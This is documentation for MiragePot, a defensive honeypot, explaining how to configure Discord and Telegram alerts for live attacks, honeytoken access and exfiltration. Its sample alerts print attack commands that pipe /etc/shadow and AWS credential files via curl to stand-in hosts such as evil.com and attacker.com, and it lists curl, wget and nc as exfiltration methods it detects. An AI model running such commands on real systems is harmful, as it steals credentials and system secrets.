# Real-time Attack Notifications

MiragePot includes a powerful real-time notification system that alerts security teams when live attacks occur. Get instant Discord or Telegram notifications for high-risk sessions, dangerous commands, honeytoken access, and data exfiltration attempts.

## Table of Contents

- [Features](#features)
- [Quick Start](#quick-start)
- [Discord Setup](#discord-setup)
- [Telegram Setup](#telegram-setup-optional)
- [Configuration](#configuration)
- [Notification Types](#notification-types)
- [Rate Limiting](#rate-limiting)
- [Troubleshooting](#troubleshooting)
- [Security Considerations](#security-considerations)

---

## Features

### 🚨 Real-time Attack Alerts

- **Session End Summaries**: Get detailed reports when high-risk attack sessions end
  - Complete MITRE ATT&CK technique mapping
  - Attack stage progression (reconnaissance → persistence → exfiltration)
  - Full session JSON attached for forensic analysis
  - Risk level assessment (low/medium/high/critical)

- **High-Threat Commands**: Instant alerts for dangerous commands
  - Commands with threat score ≥ 80/100
  - Includes attacker IP, session ID, and full command

- **Honeytoken Access**: Alerts when attackers view fake credentials
  - AWS keys, SSH keys, database passwords, API tokens
  - Shows which file was accessed and what command was used

- **Exfiltration Attempts**: Critical alerts when data is being stolen
  - Detects curl POST, wget, nc, and other exfiltration methods
  - Shows destination and what tokens are being exfiltrated

### 🎨 Rich Discord Embeds

Color-coded notifications for quick threat assessment:
- 🔴 **Red**: Critical threats (exfiltration, risk level: critical)
- 🟠 **Orange**: High-risk sessions
- 🟡 **Yellow**: Honeytoken access
- 🔵 **Blue**: Informational alerts

### ⚡ Performance

- **Non-blocking**: Notifications sent asynchronously, won't slow down honeypot
- **Rate limiting**: Token bucket algorithm prevents spam (default: 10/minute)
- **Lightweight**: <50ms latency added to attack detection

---

## Quick Start

### 1. Create Discord Server & Webhooks

1. **Create a Discord server** (or use existing):
   - Open Discord → Click `+` → "Create My Own"
   - Name it: `MiragePot Security Monitoring`

2. **Create two channels**:
   - `#alertmanager-infra` - Infrastructure alerts from Prometheus
   - `#live-attacks` - Real-time attack notifications

3. **Create webhooks** for each channel:
   - Right-click channel → Edit Channel → Integrations → Webhooks
   - Click "New Webhook"
   - Name: `MiragePot Live` (for #live-attacks)
   - Click "Copy Webhook URL"
   - Save this URL (you'll need it in step 2)

### 2. Configure MiragePot

Edit your `.env` file (or create from `.env.example`):

```bash
# Enable notifications
MIRAGEPOT_NOTIFICATIONS_ENABLED=true

# Discord webhook URL (from step 1)
MIRAGEPOT_DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_TOKEN

# Minimum risk level to notify (low, medium, high, critical)
MIRAGEPOT_NOTIFY_MIN_RISK=high

# Enable specific notification types
MIRAGEPOT_NOTIFY_SESSION_END=true
MIRAGEPOT_NOTIFY_REALTIME=true
MIRAGEPOT_NOTIFY_HONEYTOKENS_ACCESS=true
MIRAGEPOT_NOTIFY_HONEYTOKENS_EXFIL=true

# Include full session JSON in notifications
MIRAGEPOT_NOTIFY_INCLUDE_JSON=true

# Rate limit (notifications per minute)
MIRAGEPOT_NOTIFY_RATE_LIMIT=10
```

### 3. Test the Setup

Run the test script to verify notifications work:

```bash
python test_notifications.py
```

You should see 4 test messages in your Discord `#live-attacks` channel within seconds.

### 4. Start MiragePot

```bash
python -m miragepot
```

Notifications will now be sent automatically when attacks occur!

---

## Discord Setup

### Creating a Discord Webhook

**Step 1: Access Channel Settings**
- Right-click on the channel (e.g., `#live-attacks`)
- Click "Edit Channel"

**Step 2: Create Webhook**
- Go to "Integrations" tab
- Click "Webhooks" → "New Webhook"
- Name: `MiragePot Live`
- (Optional) Upload an icon/avatar

**Step 3: Copy Webhook URL**
- Click "Copy Webhook URL"
- Save this URL securely

**Step 4: Add to Configuration**
```bash
MIRAGEPOT_DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/1234567890/AbCdEfGhIjKlMnOpQrStUvWxYz
```

### Webhook Security

⚠️ **Important**: Webhook URLs are sensitive!
- Anyone with the URL can post to your Discord channel
- Never commit webhook URLs to git (use `.env` files)
- Don't share webhook URLs publicly
- If compromised, delete the webhook and create a new one

### Discord Rate Limits

Discord webhooks have rate limits:
- **5 requests per 2 seconds** per webhook
- MiragePot's built-in rate limiter respects these limits
- If you hit rate limits, increase `MIRAGEPOT_NOTIFY_RATE_LIMIT` interval

---

## Telegram Setup (Optional)

### Creating a Telegram Bot

**Step 1: Message @BotFather**
1. Open Telegram and search for `@BotFather`
2. Start a chat and send `/newbot`
3. Follow prompts to name your bot (e.g., `MiragePot Alert Bot`)
4. Save the **Bot Token** (looks like: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)

**Step 2: Get Chat ID**
1. Message your bot (send any text)
2. Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
3. Look for `"chat":{"id":123456789}` in the JSON response
4. Save this **Chat ID**

**Step 3: Configure MiragePot**
```bash
MIRAGEPOT_TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
MIRAGEPOT_TELEGRAM_CHAT_ID=123456789
```

### Telegram vs Discord

| Feature | Discord | Telegram |
|---------|---------|----------|
| Setup Complexity | Easy (just webhook URL) | Medium (bot + chat ID) |
| Rich Formatting | ✅ Embeds with colors | ⚠️ Markdown only |
| File Attachments | ✅ 8MB | ✅ 50MB |
| Rate Limits | 5 req/2s | 30 msg/s |
| Best For | Team channels | Personal alerts |

**Recommendation**: Start with Discord for better visual experience, add Telegram later if needed.

---

## Configuration

### Environment Variables

All notification settings are configured via environment variables in `.env`:

#### Core Settings

```bash
# Enable/disable entire notification system
MIRAGEPOT_NOTIFICATIONS_ENABLED=true

# Discord webhook URL
MIRAGEPOT_DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/...

# Telegram settings (optional)
MIRAGEPOT_TELEGRAM_BOT_TOKEN=
MIRAGEPOT_TELEGRAM_CHAT_ID=
```

#### Filtering Settings

```bash
# Minimum risk level to trigger notifications
# Options: low, medium, high, critical
# Default: high (only high and critical sessions notify)
MIRAGEPOT_NOTIFY_MIN_RISK=high
```

#### Notification Types

```bash
# Send notification when high-risk session ends
MIRAGEPOT_NOTIFY_SESSION_END=true

# Send real-time alerts for high-threat commands (score >= 80)
MIRAGEPOT_NOTIFY_REALTIME=true

# Notify when honeytokens are accessed (viewed)
MIRAGEPOT_NOTIFY_HONEYTOKENS_ACCESS=true

# Notify when honeytokens are exfiltrated (curl POST, wget, etc.)
MIRAGEPOT_NOTIFY_HONEYTOKENS_EXFIL=true
```

#### Content Settings

```bash
# Attach full session JSON to end-of-session notifications
MIRAGEPOT_NOTIFY_INCLUDE_JSON=true

# Include text summary in notifications
MIRAGEPOT_NOTIFY_INCLUDE_SUMMARY=true
```

#### Performance Settings

```bash
# Maximum notifications per minute (rate limiting)
# Prevents spam during mass attacks
# Default: 10
MIRAGEPOT_NOTIFY_RATE_LIMIT=10
```

### Configuration Examples

**High-Security Environment** (notify everything):
```bash
MIRAGEPOT_NOTIFICATIONS_ENABLED=true
MIRAGEPOT_NOTIFY_MIN_RISK=low
MIRAGEPOT_NOTIFY_SESSION_END=true
MIRAGEPOT_NOTIFY_REALTIME=true
MIRAGEPOT_NOTIFY_HONEYTOKENS_ACCESS=true
MIRAGEPOT_NOTIFY_HONEYTOKENS_EXFIL=true
MIRAGEPOT_NOTIFY_RATE_LIMIT=20
```

**Low-Noise Environment** (only critical threats):
```bash
MIRAGEPOT_NOTIFICATIONS_ENABLED=true
MIRAGEPOT_NOTIFY_MIN_RISK=critical
MIRAGEPOT_NOTIFY_SESSION_END=true
MIRAGEPOT_NOTIFY_REALTIME=false
MIRAGEPOT_NOTIFY_HONEYTOKENS_ACCESS=false
MIRAGEPOT_NOTIFY_HONEYTOKENS_EXFIL=true
MIRAGEPOT_NOTIFY_RATE_LIMIT=5
```

**Testing/Demo** (verbose):
```bash
MIRAGEPOT_NOTIFICATIONS_ENABLED=true
MIRAGEPOT_NOTIFY_MIN_RISK=medium
MIRAGEPOT_NOTIFY_SESSION_END=true
MIRAGEPOT_NOTIFY_REALTIME=true
MIRAGEPOT_NOTIFY_HONEYTOKENS_ACCESS=true
MIRAGEPOT_NOTIFY_HONEYTOKENS_EXFIL=true
MIRAGEPOT_NOTIFY_INCLUDE_JSON=true
MIRAGEPOT_NOTIFY_RATE_LIMIT=30
```

---

## Notification Types

### 1. Session End Summary

**Triggered when**: High-risk attack session ends (risk level ≥ configured threshold)

**Contains**:
- Attacker IP address and session ID
- Session duration and command count
- Risk level assessment (high/critical)
- Attack stage (reconnaissance, persistence, lateral_movement, etc.)
- MITRE ATT&CK techniques detected (top 3)
- Honeytoken activity (if any)
- **Attachment**: Full session JSON with complete forensics

**Example**:
```
🚨 HIGH RISK ATTACK SESSION ENDED

IP Address: 45.141.84.197
Session ID: a3f9c2e1b4d8
Duration: 95 seconds
Risk Level: ⚠️ HIGH
Commands Executed: 12

Attack Profile:
Stage: Credential Access
Techniques: 4 MITRE ATT&CK patterns
  • T1003.008: /etc/shadow Access
  • T1552.001: Credentials in Files
  • T1552.004: Private Keys

Honeytoken Activity:
🔑 Tokens Accessed: 2
📤 Exfiltration Attempts: 1

Token Types:
  • AWS Access Key
  • AWS Secret Key

Session Log: [Download JSON]
```

### 2. High-Threat Command Alert

**Triggered when**: Command with threat score ≥ 80/100 is executed

**Contains**:
- Command that was executed
- Threat score (0-100)
- Attacker IP and session ID

**Example**:
```
⚡ HIGH THREAT COMMAND DETECTED

Command:
```bash
cat /etc/shadow | curl -X POST http://evil.com/exfil -d @-
```

Threat Score: 95/100
Attacker IP: 103.75.190.88
Session ID: f4a2c9d3e8b1
```

### 3. Honeytoken Access Alert

**Triggered when**: Attacker views fake credentials (AWS keys, SSH keys, etc.)

**Contains**:
- Token type (AWS Access Key, SSH Private Key, etc.)
- File path where token is stored
- Command used to access the token
- Attacker IP and session ID

**Example**:
```
🍯 HONEYTOKEN ACCESSED

Token Type: AWS Access Key
File Path: ~/.aws/credentials
Session ID: f4a2c9d3e8b1
Attacker IP: 103.75.190.88

Command:
```bash
cat ~/.aws/credentials
```
```

### 4. Exfiltration Attempt Alert

**Triggered when**: Attacker tries to exfiltrate honeytokens via curl POST, wget, nc, etc.

**Contains**:
- Exfiltration destination (URL, IP, etc.)
- Token types being exfiltrated
- Command performing the exfiltration
- Attacker IP and session ID

**Example**:
```
🚨 HONEYTOKEN EXFILTRATION ATTEMPT

Destination: http://attacker.com:8080

Tokens Involved:
  • AWS Access Key
  • AWS Secret Key

Attacker IP: 103.75.190.88
Session ID: f4a2c9d3e8b1

Command:
```bash
curl -X POST http://attacker.com:8080 -d @/root/.aws/credentials
```
```

---

## Rate Limiting

MiragePot includes built-in rate limiting to prevent notification spam during mass attacks.

### How It Works

**Token Bucket Algorithm**:
1. You get a "bucket" with a certain number of tokens (default: 10)
2. Each notification consumes 1 token
3. Tokens refill at a rate of `max_per_minute / 60` per second
4. If bucket is empty, notifications are rate-limited (logged but not sent)

### Configuration

```bash
# Allow up to 10 notifications per minute
MIRAGEPOT_NOTIFY_RATE_LIMIT=10
```

### When Rate Limiting Kicks In

**Normal Usage**: Rate limiting is rarely triggered
- Individual attackers: 1-2 notifications per session
- Low-volume scanning: No impact

**High-Volume Scenarios** (rate limiting helps):
- Mass automated attacks (100+ sessions/minute)
- Botnet attacks
- Aggressive port scanning

### Rate Limit Exceeded Behavior

When rate limit is reached:
1. Notification is **not sent** to Discord/Telegram
2. Warning logged to MiragePot logs:
   ```
   WARNING: Rate limit exceeded, skipping notification
   ```
3. Attack is still **fully logged** to session JSON
4. Prometheus metrics still **recorded**

**Impact**: No data loss, just reduced real-time alerting during extreme attack volumes.

### Adjusting Rate Limits

**Increase limit** (more notifications allowed):
```bash
MIRAGEPOT_NOTIFY_RATE_LIMIT=20  # Allow 20/minute
```

**Decrease limit** (reduce noise):
```bash
MIRAGEPOT_NOTIFY_RATE_LIMIT=5   # Allow 5/minute
```

**Recommendation**: Start with default (10), adjust based on your attack volume.

---

## Troubleshooting

### Notifications Not Appearing

**1. Check if notifications are enabled**:
```bash
grep MIRAGEPOT_NOTIFICATIONS_ENABLED .env
# Should show: MIRAGEPOT_NOTIFICATIONS_ENABLED=true
```

**2. Verify webhook URL is set**:
```bash
grep MIRAGEPOT_DISCORD_WEBHOOK_URL .env
# Should show a valid Discord webhook URL
```

**3. Test the webhook directly**:
```bash
python test_notifications.py
```

If this fails, check:
- Webhook URL is correct (no typos)
- Webhook hasn't been deleted in Discord
- Network connectivity (can reach Discord API)

**4. Check MiragePot logs**:
```bash
# Look for notification-related errors
grep -i "notification\|discord" data/logs/miragepot.log
```

### Webhook URL Invalid Error

**Error**: `Failed to send Discord notification: 404 Not Found`

**Solution**:
- Webhook was deleted or URL is incorrect
- Go to Discord → Channel Settings → Integrations → Webhooks
- Verify webhook exists
- Copy URL again and update `.env`

### Rate Limit Errors

**Error**: `Rate limit exceeded, skipping notification`

**Solution**:
- This is normal during high-volume attacks
- Increase rate limit: `MIRAGEPOT_NOTIFY_RATE_LIMIT=20`
- Or reduce notification types (disable realtime alerts)

### Notifications Too Noisy

**Problem**: Too many notifications, overwhelming the channel

**Solutions**:

1. **Increase risk threshold**:
   ```bash
   MIRAGEPOT_NOTIFY_MIN_RISK=critical  # Only critical threats
   ```

2. **Disable realtime command alerts**:
   ```bash
   MIRAGEPOT_NOTIFY_REALTIME=false  # Only session summaries
   ```

3. **Disable honeytoken access alerts**:
   ```bash
   MIRAGEPOT_NOTIFY_HONEYTOKENS_ACCESS=false  # Only exfiltration
   ```

### JSON Attachments Not Working

**Problem**: Session end notifications missing JSON attachment

**Check**:
1. `MIRAGEPOT_NOTIFY_INCLUDE_JSON=true` in `.env`
2. Session JSON file exists in `data/logs/session_*.json`
3. File size < 8MB (Discord limit)

**Discord file size limits**:
- Free: 8MB
- Nitro: 100MB

If sessions exceed 8MB, disable JSON attachment:
```bash
MIRAGEPOT_NOTIFY_INCLUDE_JSON=false
```

---

## Security Considerations

### Webhook URL Security

⚠️ **Webhook URLs are sensitive credentials**

**Best Practices**:
1. ✅ Store in `.env` file (gitignored)
2. ✅ Never commit to version control
3. ✅ Don't share in public channels/forums
4. ✅ Rotate regularly (monthly)
5. ✅ Delete webhooks when no longer needed

**If compromised**:
1. Delete the webhook in Discord immediately
2. Create a new webhook with a different URL
3. Update `.env` with new URL
4. Restart MiragePot

### Sensitive Data in Notifications

**What's included in notifications**:
- ✅ Attacker IP addresses (public info)
- ✅ Commands executed (fake environment)
- ✅ Fake credentials (honeytokens, not real)
- ✅ Session IDs (non-sensitive identifiers)

**What's NOT included**:
- ❌ No real credentials
- ❌ No internal system details
- ❌ No MiragePot source code paths

**Safe to share**: Notification content is safe to share for analysis, demos, or incident response.

### Discord/Telegram Privacy

**Consider**:
- Notifications contain attacker IPs (consider GDPR/privacy laws)
- Discord channels may be archived/logged
- Use private channels with restricted access
- Consider retention policies for notification history

**Recommendations**:
- Create a private Discord server (invite-only)
- Use role-based access control (Security Team role)
- Enable 2FA for Discord account
- Review channel permissions regularly

### Network Security

**Outbound connections**:
- MiragePot makes HTTPS POST requests to Discord/Telegram
- Ensure firewall allows outbound HTTPS (443)
- No inbound connections required for notifications

**Docker environments**:
- Webhook URLs work from Docker containers
- No special network configuration needed
- Environment variables passed via `docker-compose.yml`

---

## FAQ

**Q: Can I use multiple Discord channels?**  
A: Yes! Set multiple webhooks in separate environment variables (requires code modification) or use the same webhook for all notifications.

**Q: Can I send to both Discord and Telegram?**  
A: Yes! Set both `DISCORD_WEBHOOK_URL` and `TELEGRAM_BOT_TOKEN`. Notifications will be sent to both platforms.

**Q: Will notifications slow down the honeypot?**  
A: No. Notifications are sent asynchronously with minimal latency (<50ms). The honeypot continues processing attacks without delay.

**Q: What happens if Discord is down?**  
A: Notification will fail gracefully. Error is logged to MiragePot logs, but the honeypot continues operating normally. All attack data is still saved to JSON logs.

**Q: Can I customize notification format?**  
A: Yes! Edit `miragepot/notifications.py` to customize embed colors, fields, and formatting. Restart MiragePot after changes.

**Q: How do I test notifications without running an attack?**  
A: Run `python test_notifications.py` to send test messages to your Discord channel.

**Q: Can I integrate with Slack/Teams/PagerDuty?**  
A: Not currently built-in, but you can:
1. Use Slack's "Email to channel" feature (forward Telegram alerts)
2. Use Zapier/IFTTT to bridge Discord → other platforms
3. Extend `notifications.py` with custom integrations

---

## Advanced Usage

### Custom Notification Logic

Edit `miragepot/notifications.py` to add custom logic:

```python
# Example: Only notify for specific IPs
def send_session_end_summary(self, session_log: Dict[str, Any]) -> None:
    attacker_ip = session_log.get("attacker_ip", "")
    
    # Custom filtering
    if attacker_ip.startswith("192.168."):
        return  # Skip internal IPs
    
    # ... rest of notification logic
```

### Integration with SIEM

Export notification events to SIEM:

1. **Via Syslog**: Add syslog handler to `notifications.py`
2. **Via Webhook**: Forward Discord webhooks to SIEM ingestion endpoint
3. **Via Log Files**: Parse MiragePot logs for notification events

### Monitoring Notification Health

Check Prometheus metrics:
```
miragepot_notifications_sent_total
miragepot_notifications_failed_total
miragepot_notification_delivery_duration_seconds
```

Alert if notification failures increase:
```yaml
# Prometheus alert rule
- alert: NotificationFailureRateHigh
  expr: rate(miragepot_notifications_failed_total[5m]) > 0.1
  annotations:
    summary: "High notification failure rate"
```

---

## Getting Help

**Issues with notifications?**

1. Check this documentation first
2. Run `python test_notifications.py` to isolate the issue
3. Check logs: `tail -f data/logs/miragepot.log | grep -i notification`
4. Open an issue on GitHub with:
   - MiragePot version
   - `.env` configuration (redact webhook URLs!)
   - Error messages from logs
   - Output of test script

---

**Last Updated**: 2026-03-30  
**MiragePot Version**: 0.3.0+  
**Maintained by**: MiragePot Team
